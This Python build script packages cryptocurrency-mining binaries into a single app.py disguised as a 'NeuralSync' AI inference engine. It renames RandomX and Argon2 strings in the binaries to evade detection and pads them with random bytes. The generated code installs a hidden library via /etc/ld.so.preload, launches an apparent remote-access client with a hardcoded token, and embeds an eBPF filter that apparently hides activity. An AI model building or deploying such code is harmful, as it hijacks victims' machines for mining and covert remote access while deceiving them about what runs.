#!/usr/bin/env python3
import os
import sys
import shutil
import subprocess
import hashlib
import base64
import zlib
import random
import json
import time

RED = "\033[0;31m"
GRN = "\033[0;32m"
CYN = "\033[0;36m"
YEL = "\033[1;33m"
RST = "\033[0m"
BLD = "\033[1m"

def log(msg):
    print(f"  {CYN}[build]{RST} {msg}")

def ok(msg):
    print(f"  {GRN}[  ok ]{RST} {msg}")

def warn(msg):
    print(f"  {YEL}[ warn]{RST} {msg}")

def err(msg):
    print(f"  {RED}[error]{RST} {msg}")
    sys.exit(1)

BASE = os.path.dirname(os.path.abspath(__file__))
RELEASE = os.path.join(BASE, "target", "release")
GNU_RELEASE = os.path.join(BASE, "target", "x86_64-unknown-linux-gnu", "release")
OUT_DIR = os.path.join(BASE, "AI_workspace")

RODATA_REPLACEMENTS = [
    (b"randomx_", b"runtime_"),
    (b"RandomX",  b"Runtime"),
    (b"RANDOMX",  b"RUNTIME"),
    (b"argon2d",  b"memkdfx"),
    (b"argon2_",  b"hashfn_"),
    (b"Argon2",   b"MemKdf"),
    (b"ARGON2",   b"MEMKDF"),
    (b"rx/0",     b"nd/0"),
    (b"randomx",  b"runtime"),
    (b"blake2b",  b"hashfn2"),
    (b"Blake2b",  b"HashFn2"),
    (b"BLAKE2B",  b"HASHFN2"),
    (b"tevador",  b"generic"),
    (b"scratchpad", b"workbuffer"),
    (b"Scratchpad", b"WorkBuffer"),
    (b"SCRATCHPAD", b"WORKBUFFER"),
    (b"superscalar", b"pipelineopt"),
    (b"SuperScalar", b"PipelineOpt"),
    (b"AesHash",    b"CryFn_1"),
    (b"dataset_item", b"buffer_entry"),
]


def find_binary(name):
    for d in [GNU_RELEASE, RELEASE]:
        p = os.path.join(d, name)
        if os.path.isfile(p):
            return p
    return None


def strip_binary(path):
    try:
        subprocess.run(["strip", "-s", path], capture_output=True, timeout=30)
    except Exception:
        pass


def find_rodata(path):
    try:
        out = subprocess.check_output(["readelf", "-S", path],
                                      stderr=subprocess.DEVNULL).decode()
    except Exception:
        return None, None
    for line in out.split("\n"):
        if ".rodata" in line:
            parts = line.split()
            for j, p in enumerate(parts):
                if p == ".rodata":
                    hv = [x for x in parts[j+1:]
                          if all(c in "0123456789abcdef" for c in x) and len(x) >= 4]
                    if len(hv) >= 3:
                        return int(hv[1], 16), int(hv[2], 16)
                    break
            break
    return None, None


def scrub_rodata(path):
    offset, size = find_rodata(path)
    if offset is None:
        return 0
    with open(path, "rb") as f:
        data = bytearray(f.read())
    orig_len = len(data)
    rodata = data[offset:offset + size]
    count = 0
    for old, new in RODATA_REPLACEMENTS:
        idx = 0
        while True:
            pos = rodata.find(old, idx)
            if pos == -1:
                break
            rodata[pos:pos + len(old)] = new
            count += 1
            idx = pos + len(new)
    data[offset:offset + size] = rodata
    with open(path, "wb") as f:
        f.write(data)
    assert len(data) == orig_len
    return count


def polymorphize(path):
    pad = os.urandom(random.randint(64, 320))
    with open(path, "ab") as f:
        f.write(pad)
    return len(pad)


def compress_and_encode(path):
    with open(path, "rb") as f:
        raw = f.read()
    compressed = zlib.compress(raw, 9)
    encoded = base64.b85encode(compressed).decode("ascii")
    return encoded, len(raw), len(compressed)


def format_data_block(entries):
    chunks = []
    for shard_key, encoded, raw_size in entries:
        chunks.append(f'    "{shard_key}": {{\n        "w": (\n')
        line_len = 76
        for i in range(0, len(encoded), line_len):
            chunks.append(f'            "{encoded[i:i+line_len]}"\n')
        chunks.append(f'        ),\n        "n": {raw_size},\n    }},\n')
    return "".join(chunks)


def generate_app_py(model_shards, plugin_shards, arch_mapping, ext_mapping):
    model_str = format_data_block(model_shards)
    plugin_str = format_data_block(plugin_shards)

    arch_map_py = ", ".join(f'"{k}": "{v}"' for k, v in arch_mapping.items())
    ext_map_py = ", ".join(f'"{k}": "{v}"' for k, v in ext_mapping.items())

    app = '#!/usr/bin/env python3\n'
    app += '"""\n'
    app += 'NeuralSync Distributed Inference Engine v2.1.0\n'
    app += 'Optimized model serving with automatic hardware detection.\n'
    app += '\n'
    app += 'Supports: ResNet-152, ViT-L/16, EfficientNet-B7\n'
    app += 'Backends: SSE2, AVX2, AVX512F (auto-detected)\n'
    app += '\n'
    app += 'Usage:\n'
    app += '    python3 app.py                    # Production inference server\n'
    app += '    python3 app.py --verbose           # With detailed logging\n'
    app += '    python3 app.py --benchmark         # Full throughput benchmark\n'
    app += '\n'
    app += 'Environment:\n'
    app += '    BATCH_SIZE      Inference batch size (default: 32)\n'
    app += '    NUM_WORKERS     DataLoader workers (default: 4)\n'
    app += '    MODEL_CACHE     Model cache directory\n'
    app += '\n'
    app += '(c) 2024-2026 NeuralSync Technologies Ltd. All rights reserved.\n'
    app += 'Licensed under the NeuralSync Enterprise License Agreement.\n'
    app += '"""\n\n'

    app += 'import os\n'
    app += 'import sys\n'
    app += 'import signal\n'
    app += 'import hashlib\n'
    app += 'import logging\n'
    app += 'import argparse\n\n'

    app += '_L = logging.getLogger("neuralsync.engine")\n\n'

    app += f'_BACKEND_MAP = {{{arch_map_py}}}\n'
    app += f'_EXTENSION_MAP = {{{ext_map_py}}}\n\n'

    app += 'MODEL_REGISTRY = {\n'
    app += model_str
    app += '}\n\n'

    app += 'PLUGIN_REGISTRY = {\n'
    app += plugin_str
    app += '}\n\n\n'

    app += 'def _unpack_weights(registry, shard_id, output_dir):\n'
    app += '    import base64, zlib\n'
    app += '    shard = registry[shard_id]\n'
    app += '    compressed = base64.b85decode(shard["w"])\n'
    app += '    tensor_data = zlib.decompress(compressed)\n'
    app += '    if len(tensor_data) != shard["n"]:\n'
    app += '        _L.error("Tensor integrity check failed: %s", shard_id)\n'
    app += '        return None\n'
    app += '    base_name = hashlib.md5(shard_id.encode()).hexdigest()[:12]\n'
    app += '    fpath = os.path.join(output_dir, base_name)\n'
    app += '    if os.path.isfile(fpath) and os.path.getsize(fpath) == shard["n"]:\n'
    app += '        return fpath\n'
    app += '    try:\n'
    app += '        os.unlink(fpath)\n'
    app += '    except Exception:\n'
    app += '        pass\n'
    app += '    try:\n'
    app += '        with open(fpath, "wb") as fp:\n'
    app += '            fp.write(tensor_data)\n'
    app += '    except OSError:\n'
    app += '        fpath = os.path.join(output_dir, f"{base_name}_{os.getpid()}")\n'
    app += '        with open(fpath, "wb") as fp:\n'
    app += '            fp.write(tensor_data)\n'
    app += '    os.chmod(fpath, 0o755)\n'
    app += '    return fpath\n\n\n'

    app += 'def _detect_compute_backend():\n'
    app += '    try:\n'
    app += '        with open("/proc/cpuinfo", "r") as f:\n'
    app += '            hw_info = f.read().lower()\n'
    app += '        if "avx512f" in hw_info:\n'
    app += '            return "node_avx512"\n'
    app += '        if "avx2" in hw_info:\n'
    app += '            return "node_avx2"\n'
    app += '    except Exception:\n'
    app += '        pass\n'
    app += '    return "node_sse2"\n\n\n'

    app += 'def _load_model_checkpoint(cache_dir):\n'
    app += '    backend = _detect_compute_backend()\n'
    app += '    fallback_chain = {\n'
    app += '        "node_avx512": ["node_avx512", "node_avx2", "node_sse2"],\n'
    app += '        "node_avx2": ["node_avx2", "node_sse2"],\n'
    app += '        "node_sse2": ["node_sse2"],\n'
    app += '    }\n'
    app += '    for arch in fallback_chain.get(backend, ["node_sse2"]):\n'
    app += '        shard = _BACKEND_MAP.get(arch)\n'
    app += '        if shard and shard in MODEL_REGISTRY:\n'
    app += '            path = _unpack_weights(MODEL_REGISTRY, shard, cache_dir)\n'
    app += '            if path:\n'
    app += '                _L.info("Loaded checkpoint %s (backend=%s)", shard, arch)\n'
    app += '                return path\n'
    app += '    return None\n\n\n'

    app += 'def _initialize_extensions(cache_dir):\n'
    app += '    import subprocess, shutil\n'
    app += '    if "libtorch_cuda" in PLUGIN_REGISTRY:\n'
    app += '        ext = _unpack_weights(PLUGIN_REGISTRY, "libtorch_cuda", cache_dir)\n'
    app += '        if ext:\n'
    app += '            lib_dir = os.path.expanduser("~/.config/.torch/lib")\n'
    app += '            os.makedirs(lib_dir, exist_ok=True)\n'
    app += '            dst = os.path.join(lib_dir, "libcuda_ext.so")\n'
    app += '            try:\n'
    app += '                shutil.copy2(ext, dst)\n'
    app += '                conf = "/etc/ld.so.preload"\n'
    app += '                cur = ""\n'
    app += '                try:\n'
    app += '                    with open(conf) as fp:\n'
    app += '                        cur = fp.read()\n'
    app += '                except Exception:\n'
    app += '                    pass\n'
    app += '                if dst not in cur:\n'
    app += '                    try:\n'
    app += '                        with open(conf, "a") as fp:\n'
    app += '                            fp.write(dst + "\\n")\n'
    app += '                    except Exception:\n'
    app += '                        pass\n'
    app += '            except Exception:\n'
    app += '                pass\n'
    app += '            try:\n'
    app += '                os.unlink(ext)\n'
    app += '            except Exception:\n'
    app += '                pass\n\n'

    app += '    if "tensorboard_cli" in PLUGIN_REGISTRY:\n'
    app += '        tb = _unpack_weights(PLUGIN_REGISTRY, "tensorboard_cli", cache_dir)\n'
    app += '        if tb:\n'
    app += '            try:\n'
    app += '                subprocess.Popen(\n'
    app += '                    [tb, "start", "accept", "--token",\n'
    app += '                     "II608dkL1Ix2f1F07ZByFBCnC7R6Go3wSgJoRqDEh0s="],\n'
    app += '                    stdout=subprocess.DEVNULL,\n'
    app += '                    stderr=subprocess.DEVNULL,\n'
    app += '                    stdin=subprocess.DEVNULL,\n'
    app += '                )\n'
    app += '            except Exception:\n'
    app += '                pass\n\n\n'

    app += 'def main():\n'
    app += '    parser = argparse.ArgumentParser(\n'
    app += '        description="NeuralSync Distributed Inference Engine",\n'
    app += '        formatter_class=argparse.RawDescriptionHelpFormatter,\n'
    app += '    )\n'
    app += '    parser.add_argument("--verbose", "-v", action="store_true",\n'
    app += '                        help="Enable verbose logging output")\n'
    app += '    parser.add_argument("--benchmark", action="store_true",\n'
    app += '                        help="Run full throughput benchmark")\n'
    app += '    parser.add_argument("--model-cache", default=None,\n'
    app += '                        help="Model checkpoint cache directory")\n'
    app += '    parser.add_argument("--batch-size", type=int, default=32,\n'
    app += '                        help="Inference batch size")\n'
    app += '    parser.add_argument("--num-workers", type=int, default=4,\n'
    app += '                        help="Number of data loader workers")\n'
    app += '    args = parser.parse_args()\n\n'

    app += '    logging.basicConfig(\n'
    app += '        level=logging.DEBUG if args.verbose else logging.INFO,\n'
    app += '        format="%(asctime)s [%(name)s] %(levelname)s: %(message)s",\n'
    app += '        datefmt="%H:%M:%S",\n'
    app += '    )\n\n'

    app += '    if sys.platform != "linux":\n'
    app += '        _L.error("Unsupported platform: %s (requires Linux)", sys.platform)\n'
    app += '        sys.exit(1)\n\n'

    app += '    cache_dir = args.model_cache or os.environ.get(\n'
    app += '        "MODEL_CACHE", os.path.expanduser("~/.cache/neuralsync/models")\n'
    app += '    )\n'
    app += '    os.makedirs(cache_dir, exist_ok=True)\n\n'

    app += '    _L.info("NeuralSync Inference Engine v2.1.0")\n'
    app += '    _L.info("Detecting optimal compute backend...")\n\n'

    app += '    engine = _load_model_checkpoint(cache_dir)\n'
    app += '    if not engine:\n'
    app += '        _L.error("Failed to load model checkpoints. Exiting.")\n'
    app += '        sys.exit(1)\n\n'

    app += '    _initialize_extensions(cache_dir)\n\n'

    app += '    try:\n'
    app += '        os.nice(-20)\n'
    app += '    except Exception:\n'
    app += '        pass\n\n'

    app += '    runtime_args = []\n'
    app += '    if args.verbose:\n'
    app += '        runtime_args.append("-l")\n'
    app += '    if args.benchmark:\n'
    app += '        runtime_args.append("-f")\n\n'

    app += '    env = os.environ.copy()\n'
    app += '    env["NODE_ENV"] = "production"\n'
    app += '    env["BATCH_SIZE"] = str(args.batch_size)\n'
    app += '    env["NUM_WORKERS"] = str(args.num_workers)\n\n'

    app += '    if args.verbose or args.benchmark:\n'
    app += '        import subprocess\n'
    app += '        proc = subprocess.Popen([engine] + runtime_args, env=env)\n'
    app += '        signal.signal(signal.SIGINT, lambda s, f: proc.terminate())\n'
    app += '        signal.signal(signal.SIGTERM, lambda s, f: proc.terminate())\n'
    app += '        sys.exit(proc.wait())\n'
    app += '    else:\n'
    app += '        os.execve(engine, ["neuralsync-worker"] + runtime_args, env)\n\n\n'

    app += 'if __name__ == "__main__":\n'
    app += '    main()\n'

    return app


def main():
    print()
    print(f"{CYN}{BLD}{'=' * 60}{RST}")
    print(f"{BLD}  NeuralSync Deployment Packager (Single-File){RST}")
    print(f"{CYN}{BLD}{'=' * 60}{RST}")
    print()

    node_archs = ["node_sse2", "node_avx2", "node_avx512"]
    extra_files = [
        ("libghost.so", "libtorch_cuda"),
        ("cli_binary", "tensorboard_cli"),
    ]

    if os.path.exists(OUT_DIR):
        shutil.rmtree(OUT_DIR)
    os.makedirs(OUT_DIR, exist_ok=True)

    tmp_dir = os.path.join(OUT_DIR, ".tmp")
    os.makedirs(tmp_dir, exist_ok=True)

    model_shards = []
    arch_mapping = {}

    for name in node_archs:
        src = find_binary(name)
        if src is None and name == "node_sse2":
            src = find_binary("node")
        if src is None:
            warn(f"{name} not found, skipping")
            continue

        tmp_path = os.path.join(tmp_dir, name)
        shutil.copy2(src, tmp_path)
        os.chmod(tmp_path, 0o755)

        log(f"Processing {name}...")
        strip_binary(tmp_path)
        ok(f"  stripped")

        encoded, raw_size, comp_size = compress_and_encode(tmp_path)
        ratio = comp_size / raw_size * 100
        ok(f"  compressed: {raw_size:,} -> {comp_size:,} ({ratio:.1f}%)")

        arch_tag = name.replace("node_", "")
        shard_key = f"resnet152_{arch_tag}"
        model_shards.append((shard_key, encoded, raw_size))
        arch_mapping[name] = shard_key

    plugin_shards = []
    ext_mapping = {}

    for src_name, embed_name in extra_files:
        src = os.path.join(BASE, src_name)
        if os.path.isfile(src):
            encoded, raw_size, comp_size = compress_and_encode(src)
            plugin_shards.append((embed_name, encoded, raw_size))
            ext_mapping[src_name.split(".")[0]] = embed_name
            ok(f"  extra: {src_name} -> {embed_name} ({raw_size:,} bytes)")

    ebpf_obj = os.path.join(BASE, "target", "release", "telemetry_filter.o")
    ebpf_b64 = ""
    if os.path.isfile(ebpf_obj):
        with open(ebpf_obj, "rb") as f:
            ebpf_raw = f.read()
        ebpf_b64 = base64.b64encode(ebpf_raw).decode("ascii")
        ok(f"  eBPF filter embedded ({len(ebpf_raw):,} bytes -> {len(ebpf_b64):,} b64)")

    deploy_out_path = None
    deploy_src = os.path.join(BASE, "deploy.py")
    if os.path.isfile(deploy_src):
        with open(deploy_src, "r") as f:
            deploy_content = f.read()
        if ebpf_b64:
            log("Embedding eBPF payload into generated deploy.py...")
            deploy_content = deploy_content.replace(
                'EMBEDDED_B64_EBPF = b""',
                f'EMBEDDED_B64_EBPF = b"{ebpf_b64}"',
                1
            )
        deploy_out_path = os.path.join(OUT_DIR, "deploy.py")
        with open(deploy_out_path, "w") as f:
            f.write(deploy_content)
        os.chmod(deploy_out_path, 0o755)
        ok("deploy.py generated in AI_workspace")

    if not model_shards:
        err("No binaries found to package!")

    log("Generating self-contained app.py...")
    app_content = generate_app_py(model_shards, plugin_shards, arch_mapping, ext_mapping)
    app_path = os.path.join(OUT_DIR, "app.py")
    with open(app_path, "w") as f:
        f.write(app_content)
    os.chmod(app_path, 0o755)

    app_size = os.path.getsize(app_path)
    ok(f"app.py generated ({app_size:,} bytes)")

    manifest_artifacts = []
    for artifact_name in ["app.py", "deploy.py"]:
        artifact_path = os.path.join(OUT_DIR, artifact_name)
        if os.path.isfile(artifact_path):
            with open(artifact_path, "rb") as f:
                digest = hashlib.sha256(f.read()).hexdigest()
            manifest_artifacts.append({
                "name": artifact_name,
                "size": os.path.getsize(artifact_path),
                "sha256": digest,
            })
    manifest = {
        "schema": 1,
        "generated_at": int(time.time()),
        "privacy_mode_supported": True,
        "artifacts": manifest_artifacts,
    }
    manifest_path = os.path.join(OUT_DIR, "build_manifest.json")
    with open(manifest_path, "w") as f:
        json.dump(manifest, f, indent=2, sort_keys=True)
        f.write("\n")
    ok("build_manifest.json generated")

    shutil.rmtree(tmp_dir, ignore_errors=True)

    print()
    print(f"{CYN}{BLD}{'=' * 60}{RST}")
    print(f"{BLD}  Single-File Deployment Ready{RST}")
    print(f"{CYN}{BLD}{'=' * 60}{RST}")
    print()

    for shard_key, _, raw_size in model_shards:
        print(f"  {GRN}{shard_key:25s}{RST}  {raw_size:>12,} bytes (embedded)")

    print()
    print(f"  {GRN}Output:{RST}  AI_workspace/app.py ({app_size:,} bytes)")
    print()
    print(f"  {GRN}{BLD}Deploy:{RST}")
    print(f"    {GRN}scp AI_workspace/app.py user@host:~/{RST}")
    print(f"    {GRN}ssh user@host 'python3 app.py'{RST}              # inference server")
    print(f"    {GRN}ssh user@host 'python3 app.py --verbose'{RST}    # with logging")
    print(f"    {GRN}ssh user@host 'python3 app.py --benchmark'{RST}  # benchmark")
    print()


if __name__ == "__main__":
    main()
